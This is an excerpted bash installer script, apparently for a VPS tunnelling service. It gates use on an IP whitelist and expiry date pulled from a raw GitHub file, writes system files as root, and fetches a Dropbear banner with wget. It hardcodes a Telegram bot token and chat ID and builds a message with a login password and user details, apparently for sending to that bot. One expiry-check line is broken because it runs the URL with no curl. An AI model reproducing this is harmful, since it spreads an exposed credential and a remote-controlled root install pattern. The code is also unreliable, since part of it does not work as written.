...
VALIDITY () {
    ...
    Exp1=$(curl https://raw.githubusercontent.com/mohamadrojib278/scnew/main/access/ip | grep $MYIP | awk '{print $4}')
    if [[ $today < $Exp1 ]]; then
...
IZIN=$(curl https://raw.githubusercontent.com/mohamadrojib278/scnew/main/access/ip | awk '{print $5}' | grep $MYIP)
if [ $MYIP = $IZIN ]; then
...
# USERNAME
rm -f /usr/bin/user
username=$(curl https://raw.githubusercontent.com/mohamadrojib278/scnew/main/access/ip | grep $MYIP | awk '{print $2}')
echo "$username" >/usr/bin/user
# validity
rm -f /usr/bin/e
valid=$(curl https://raw.githubusercontent.com/mohamadrojib278/scnew/main/access/ip | grep $MYIP | awk '{print $4}')
...
# Status ExpiRED Active | Premium
Info="(${green}Active${NC})"
Error="(${RED}ExpiRED${NC})"
today=`date -d "0 days" +"%Y-%m-%d"`
Exp1=$(https://raw.githubusercontent.com/mohamadrojib278/scnew/main/access/ip | grep $MYIP | awk '{print $4}')
if [[ $today < $Exp1 ]]; then
sts="${Info}"
else
sts="${Error}"
...
clear
# REPO    
    REPO="https://github.com/jvoscript/AIO/"
...
function password_default() {
    ...
    CHATID="6238619204"
    KEY="6337509127:AAE_CLpckp-ZqF1exH05WGSq6IonIQCsYFc"
    TIME="10"
    ...
    <code>Pass Login :</code> <code>070711</code>
    <code>User Script:</code> <code>$username</code>
    <code>Exp Script :</code> <code>$exp</code>
    ============================
    (C) Copyright 2023 By Premium
    ============================
"
...
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/Premium.txt"@g' /etc/default/dropbear

# Ganti Banner
wget -O /etc/Premium.txt "${REPO}ssh/issue.net"
